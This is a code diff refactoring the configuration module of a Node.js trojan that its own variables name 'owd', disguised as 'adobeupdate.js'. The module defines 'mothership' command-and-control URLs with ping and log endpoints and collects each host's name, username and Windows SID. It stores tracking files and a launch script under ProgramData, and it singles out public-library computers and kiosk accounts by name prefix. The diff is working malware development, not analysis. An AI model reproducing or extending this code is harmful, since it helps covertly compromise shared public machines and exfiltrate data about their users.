@@ -7,8 +7,9 @@ const os = require("os");
 const crypto = require("crypto");
 const util = require("util");
 
-const helper = require("./adobeupdate.helper.js");
+var pubnubconfig = {};
 
+// TODO change logic such that mothership bounces around unless a cmd is running
 // refactor to read/write mothershipconfig.json
 var mothershipconfig = {
     get mothershipconfigfpath() {
@@ -30,6 +31,10 @@ var mothershipconfig = {
     mothershiplist: [
         "https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault",
     ],
+
+    get logmsgurl() {
+        return this.mothership + "/ow/logmsg.php";
+    },
 
     get pingurl() {
         return this.mothership + "/ow/ping.php";
@@ -71,13 +76,20 @@ var mothershipconfig = {
 
         return mothershipurl;
     },
+
+    readconfig: function () {},
+
+    writeconfig: function () {},
+
+    init: function () {},
 };
 
 var systemconfig = {
-    scriptts: helper.getTimestamp(),
-    cmdname: "",
-    cmdtaskname: "",
+    scriptts: "",
     istpl: "",
+
+    sessionid: "",
+    launch_script_fname: "launch.cmd",
 
     staticdelay: 30,
     trojanname: "owd",
@@ -87,8 +99,13 @@ var systemconfig = {
     launch_script_fname: "launch.cmd",
     launch_script_fpath: "",
 
-    machinename: "", // BWPCP503
-    username: "", // ADULT2022, LC2022, CAT2022
+    clientid: "",
+    sessionid: "",
+
+    scriptmd5: "",
+
+    machinename: os.hostname(), // BWPCP503
+    username: os.userInfo().username, // ADULT2022, LC2022, CAT2022
     usersid: "", // S-1-5-21-3127389091-2830476002-349640086-1001
 
     trojanfname: "adobeupdate.js",
@@ -114,10 +131,6 @@ var systemconfig = {
     get source() {
         return path.basename(this.scriptfpath);
     },
-
-    scriptmd5: "",
-
-    clientid: "",
 
     get clientidfpath() {
         return path.join(this.trojandir, "client_id");
@@ -187,7 +200,102 @@ var systemconfig = {
     },
 
     get statestr() {
-        return `cmdname=${this.cmdname} cmdtaskname=${this.cmdtaskname} ts=${this.scriptts} pid=${this.scriptpid} ppid=${this.scriptparentpid}`;
+        return `cmdname=${helper_ps.getcmdname()} cmdtaskname=${helper_ps.getcmdtaskname()} ts=${
+            this.scriptts
+        } pid=${this.scriptpid} ppid=${this.scriptparentpid} md5=${
+            this.scriptmd5
+        }`;
+    },
+
+    init: function () {
+        this.scriptts = helper.getTimestamp();
+        this.sessionid = helper.getRandomCode(8);
+
+        this.scriptfpath = helper_ps.process_argv[1];
+
+        this.trojandir = path.join(process.env.ProgramData, this.trojanname);
+
+        this.launch_script_fpath = path.join(
+            this.trojandir,
+            this.launch_script_fname
+        );
+
+        this.clientid = this.init_clientid();
+    },
+
+    init_clientid: function () {
+        let tclientid = "";
+
+        if (helper.fileExists(this.clientidfpath)) {
+            tclientid = helper.readTag(this.clientidfpath);
+        } else {
+            tclientid = helper.getRandomCode(8);
+            helper.writeTag(this.clientidfpath, tclientid);
+        }
+
+        return tclientid;
+    },
+
+    init_usersid: async function () {
+        let fpath = path.join(systemconfig.trojandir, "usersid");
+
+        let tusersid = "";
+
+        if (helper.fileExists(fpath)) {
+            tusersid = helper.readTag(fpath);
+        } else {
+            tusersid = await helper.getusersid();
+
+            helper.writeTag(fpath, tusersid);
+        }
+
+        this.usersid = tusersid;
+    },
+
+    init_scriptmd5: function () {
+        let fpath = path.join(this.trojandir, "scriptmd5");
+
+        let md5str = "";
+
+        if (helper.fileExists(fpath)) {
+            md5str = helper.readTag(fpath);
+        } else {
+            md5str = helper.getFileMD5(this.scriptfpath);
+
+            if (!helper.isNullOrWhitespace(md5str))
+                helper.writeTag(fpath, md5str);
+        }
+
+        this.scriptmd5 = md5str;
+    },
+
+    init_istpl: function () {
+        let machineprefix = this.machinename.toLowerCase().substring(0, 5);
+
+        if (
+            ["ADULT2022", "LC2022", "CAT2022"].includes(
+                this.username.toUpperCase()
+            )
+        ) {
+            this.istpl = true;
+            return;
+        }
+
+        if (
+            machineprefix == "RLPCP".toLowerCase() ||
+            machineprefix == "SJPCP".toLowerCase() ||
+            machineprefix == "BWPCP".toLowerCase()
+        ) {
+            this.istpl = true;
+            return;
+        }
+
+        if (helper.fileExists(path.join(this.trojandir, "tplmode"))) {
+            this.istpl = true;
+            return;
+        }
+
+        this.istpl = false;
     },
 };
 
@@ -370,115 +478,14 @@ module.exports = {
     startupfolderconfig,
 };
 
+const helper = require("./adobeupdate.helper.js");
 const helper_ps = require("./adobeupdate.helper.ps.js");
 
-systemconfig.machinename = os.hostname();
-
-systemconfig.username = os.userInfo().username;
-
-systemconfig.sessionid = helper.getRandomCode(8);
-
-systemconfig.trojandir = path.join(
-    process.env.ProgramData,
-    systemconfig.trojanname
-);
-
-systemconfig.launch_script_fpath = path.join(
-    systemconfig.trojandir,
-    systemconfig.launch_script_fname
-);
-
-function init_clientid() {
-    let tclientid = "";
-
-    if (helper.fileExists(systemconfig.clientidfpath)) {
-        tclientid = helper.readTag(systemconfig.clientidfpath);
-    } else {
-        tclientid = helper.getRandomCode(8);
-        helper.writeTag(systemconfig.clientidfpath, tclientid);
-    }
-
-    systemconfig.clientid = tclientid;
-}
-
-init_clientid();
-
-async function init_usersid() {
-    let fpath = path.join(systemconfig.trojandir, "usersid");
-
-    let tusersid = "";
-
-    if (helper.fileExists(fpath)) {
-        tusersid = helper.readTag(fpath);
-    } else {
-        tusersid = await helper.getusersid();
-
-        helper.writeTag(fpath, tusersid);
-    }
-
-    systemconfig.usersid = tusersid;
-}
-
-// TODO: read from file
-// S-1-5-21-3127389091-2830476002-349640086-1001
-// used for reg trigger mechanism
+systemconfig.init();
 
 (async () => {
-    await init_usersid();
+    await systemconfig.init_usersid();
 })();
 
-systemconfig.scriptfpath = helper_ps.process_argv[1];
-
-function init_scriptmd5() {
-    let fpath = path.join(systemconfig.trojandir, "scriptmd5");
-
-    let md5str = "";
-
-    if (helper.fileExists(fpath)) {
-        md5str = helper.readTag(fpath);
-    } else {
-        md5str = helper.getFileMD5(systemconfig.scriptfpath);
-
-        if (!helper.isNullOrWhitespace(md5str)) helper.writeTag(fpath, md5str);
-    }
-
-    systemconfig.scriptmd5 = md5str;
-}
-
-init_scriptmd5();
-
-// machine name:
-// SJPCP --> st. james
-// RLPCP --> yonge/bloor reference library
-// BWPCP --> bridlewood library
-function init_istpl() {
-    let machineprefix = systemconfig.machinename.toLowerCase().substring(0, 5);
-
-    if (
-        ["ADULT2022", "LC2022", "CAT2022"].includes(
-            systemconfig.username.toUpperCase()
-        )
-    ) {
-        systemconfig.istpl = true;
-    }
-
-    if (
-        machineprefix == "RLPCP".toLowerCase() ||
-        machineprefix == "SJPCP".toLowerCase()
-    ) {
-        systemconfig.istpl = true;
-    }
-
-    if (helper.fileExists(path.join(systemconfig.trojandir, "tplmode"))) {
-        systemconfig.istpl = true;
-    }
-
-    systemconfig.istpl = false;
-}
-
-init_istpl();
-
-helper.logmsg(mothershipconfig.mothershipconfigfpath);
-helper.logmsg(mothershipconfig.mothershiplist);
-helper.logmsg(mothershipconfig.mothershipassets);
-helper.logmsg(mothershipconfig.mothership);
+systemconfig.init_scriptmd5();
+systemconfig.init_istpl();
